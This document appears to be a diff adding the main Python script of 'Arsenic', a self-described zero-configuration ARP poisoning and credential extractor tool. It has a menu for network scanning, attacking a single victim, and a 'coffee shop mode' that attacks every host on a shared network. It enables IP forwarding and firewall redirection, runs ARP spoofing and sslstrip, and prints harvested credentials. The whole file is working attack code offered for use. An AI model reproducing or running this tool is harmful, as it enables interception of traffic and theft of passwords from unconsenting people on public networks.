@@ -1,0 +1,183 @@
+#!/usr/bin/env python
+
+"""Arsenic - A zero configuration ARP poisoning and credential extractor tool"""
+ 
+__author__ = "KernelSanders"
+__email__  = "kernelsanders@icloud.com"
+__license__= """
+Copyright (c) 2013 KernelSanders <kernelsanders@icloud.com>
+ 
+This program is free software; you can redistribute it and/or
+modify it under the terms of the GNU General Public License as
+published by the Free Software Foundation; either version 3 of the
+License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but
+WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program; if not, write to the Free Software
+Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+USA
+"""
+
+from arsenicModules.nmapRunner import getOwnIP, setDefaultGatewayAndInterface
+from arsenicModules.arpSpoofRunner import arpSpoof
+from arsenicModules.sslstripRunner import sslStrip
+from arsenicModules.logParser import sslstripLogParser
+from arsenicModules.livePwn import livePwn
+from arsenicModules.ping import Ping, is_valid_ip4_address
+import os, Queue, time, signal
+
+
+class arsenic(object):
+    def __init__(self):
+        self.scanning = False
+        self.mySslStripRunner = None
+        self.myParser = None
+        self.myLivePwn = None
+        self.myArpSpoof = None
+        self.credQueue = Queue.Queue()
+
+    def startSingle(self, victim):
+        print '\nSetting up...\n'
+        os.system('sysctl -w net.inet.ip.forwarding=1')
+        os.system('pfctl -e -f /usr/bin/arsenicModules/pf.conf')
+        self.myArpSpoof = arpSpoof(victim)
+        self.myArpSpoof.start()
+        self.mySslStripRunner = sslStrip()
+        self.mySslStripRunner.start()
+        self.myParser = sslstripLogParser(self.credQueue)
+        time.sleep(4)
+        self.myParser.start()
+
+    def printTheQueue(self):
+        while True:
+            time.sleep(0.1)
+            try:
+                cred = self.credQueue.get(0)
+                print cred
+            except Queue.Empty:
+                pass
+
+    def doLivePwn(self):
+        print '\nSetting up...\n'
+        os.system('sysctl -w net.inet.ip.forwarding=1')
+        os.system('pfctl -e -f /usr/bin/arsenicModules/pf.conf')
+        self.mySslStripRunner = sslStrip()
+        self.mySslStripRunner.start()
+        self.myParser = sslstripLogParser(self.credQueue)
+        self.myParser.start()
+        time.sleep(4)
+        self.myLivePwn = livePwn(self.credQueue)
+        self.myLivePwn.start()
+        self.printTheQueue()
+
+    def signal_handler(self, signum, frame):
+        print '\nQuitting...'
+        if not self.scanning:
+            if self.mySslStripRunner:
+                self.mySslStripRunner.stop()
+                print 'Shut down sslstrip'
+            if self.myParser:
+                self.myParser.stop()
+                print 'Shut down the parser'
+            if self.myArpSpoof: # Single victim mode
+                self.myArpSpoof.stop() 
+                print 'Shut down the ARP spoof'
+            if self.myLivePwn: # Coffee Shop mode
+                threadList = self.myLivePwn.getThreads()
+                for threads in threadList:
+                    print 'Shutting down ARP spoofing for ' + threads.victim
+                    threads.stop()  
+                self.myLivePwn.stop()
+                print 'Shut down all ARP spoofing threads'
+            os.system('pfctl -d')
+            os.system('sysctl -w net.inet.ip.forwarding=0')
+        os._exit(0)
+
+    def iAmRoot(self):
+        f = os.popen("whoami")
+        data = f.read()
+        f.close()
+        if data == 'root\n':
+            return True
+        else:
+            return False
+
+    def showMenu(self):
+        signal.signal(signal.SIGINT, self.signal_handler)
+        print """
+Menu:
+   1) Scan the network
+   2) Attack a single victim
+   3) Coffee shop mode (Attack all available victims
+      with live additions as hosts join the network)
+
+"""
+        choice = raw_input("Enter your choice (enter quits): ")
+        if choice == '1':
+            self.scanning = True
+            print 'My IP is ' + getOwnIP()
+            print '''Scanning... (this can take up to 30 seconds in some
+cases)'''
+            gateway, iface = setDefaultGatewayAndInterface()
+            parts = gateway.split('.')
+            network = parts[0]+'.'+parts[1]+'.'+parts[2]+'.'
+            newPing = Ping(network)
+            hostsAndStatus = newPing.doSingleScan()
+            print '\nThe following hosts are available for pwnage:'
+            for newHosts in hostsAndStatus:
+                if newHosts != 'Scan complete.':
+                    print '\t' + str(newHosts)
+                else:
+                    print newHosts
+                    break
+        elif choice == '2':
+            victim = raw_input("Enter the victim IP: ")
+            if not is_valid_ip4_address(victim):
+                print 'You entered an invalid address.'
+                os._exit(1)
+            print '\nSetting up...\n'
+            self.startSingle(victim)
+            self.printTheQueue()
+        elif choice == '3':
+            self.doLivePwn()
+        elif choice != '':
+            print 'Enter a valid choice next time'
+
+
+    def run(self):
+        if not self.iAmRoot():
+            print 'You must be root to run arsenic.'
+            os._exit(1)
+        else:
+            print """
+   _____                             .__        
+  /  _  \_______  ______ ____   ____ |__| ____  
+ /  /_\  \_  __ \/  ___// __ \ /    \|  |/ ___\ 
+/    |    \  | \/\___ \\  ___/|   |  \  \  \___ 
+\____|__  /__|  /____  >\___  >___|  /__|\___  >
+        \/           \/     \/     \/        \/ 
+A zero configuration ARP poisoning and credential
+extractor tool
+Tested on iOS 5.1.1 and 6.1.2 
+
+KernelSanders (kernelsanders@icloud.com)
+"""
+        self.showMenu()
+
+if __name__ == '__main__':
+    myArsenic = arsenic()
+    myArsenic.run()
+
+
+
+
+
+
+
+
+
